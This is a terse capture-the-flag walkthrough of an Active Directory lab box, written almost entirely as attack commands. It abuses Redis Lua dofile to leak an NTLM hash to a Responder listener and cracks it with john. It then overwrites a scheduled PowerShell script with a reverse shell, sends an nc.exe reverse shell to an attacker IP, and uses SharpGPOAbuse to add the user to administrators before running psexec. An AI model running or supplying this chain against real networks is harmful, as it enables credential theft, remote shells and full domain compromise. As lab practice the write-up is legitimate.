Interesting box, AD.
Shows open smb, but we only get the host-name from it
Buried in the auto-recon, there is a redis on port 6379
`redis-cli -h 10.48.176.50`
`>INFO`
`>CONFIG GET *`
-->"C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
We get a username here, from one of the lines of the output.

Also, turns out, redis allows us to run "sandbox lua" scripts through EVAL "dofile('cmd')"
as in `eval "dofile('//192.168.175.229//aj')" 0`
But first, start the responder and then run the above one, to connect to attacker machine and get the NTLM hash of the remote machine
`sudo responder -I tun0 -v`
`eval "dofile('//192.168.175.229//aj')" 0`
`john --wordlist=/usr/share/ordlists/rockyou.txt hash.txt`
-->sand_0873959498
Let us go back and enumerate smb shares now.
`crackmapexec smb 10.48.178.127 -u 'enterprise-security' -p 'sand_0873959498' --shares` OR
`smbclient -U 'enterprise-security' -L 10.48.178.127`
We see an Enterprise-Share
`smbclient -U 'enterprise-security'  \\\\10.48.178.127\\\Enterprise-Share`
Here, we find a PurgeIrrelevantData_1826.ps1 file, which Im guessing runs now and then automatically. Since we gots the access to write that file, we'll replace it with a powershell reverse shell and try to get a shell from https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3

For a more stable shell, we will upoad nc.exe to the share, and run this
`Start-Process -FilePath "C:\enterprise-share\nc.exe" -ArgumentList "-nv 10.9.1.246 6666 -e powershell.exe"`

```
Import-Module C:\Enterprise-Share\sharphound.ps1
Invoke-BloodHound -CollectionMethod All
```
`/opt/BloodHound-linux-x64/BloodHound --no sandbox`
But there's some issue uploading all the files
So tried with the `bloodhound --no-sandbox` which is the CE version. Bad pathfinding, but was able to make some sense, that we need to abuse GPOs. The name of the GPO is Security-Pol-vn (as the graph indicates)
So, linux abuse says pyGPOabuse.py
But since we need a way to abuse the GPOs from windows machine, we need SharpGPOAbuse.exe. Can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO.
````
wget https://github.com/byronkg/SharpGPOAbuse/raw/main/SharpGPOAbuse-master/SharpGPOAbuse.exe
````
put it into the smb share
check for group membership before executing the gpo abuse
abuse gpo, force group update, check again for group
```powershell
net user enterprise-security

.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"`

gpupdate /force

net user enterprise-security
```
Now, we have access to IP_ADDR\C$ share, which can take us to system.txt
OR
impacket-psexec enterprise-security:sand_0873959498@10.10.103.170
OR
impacket-psexec enterprise-security@10.10.90.179

---

```

PrintSpoofer is not working here but my bad it works only if the user is in `LOCAL/NETWORK SERVICE` groupe, while we are just in `NT AUTHORITY\SERVICE`.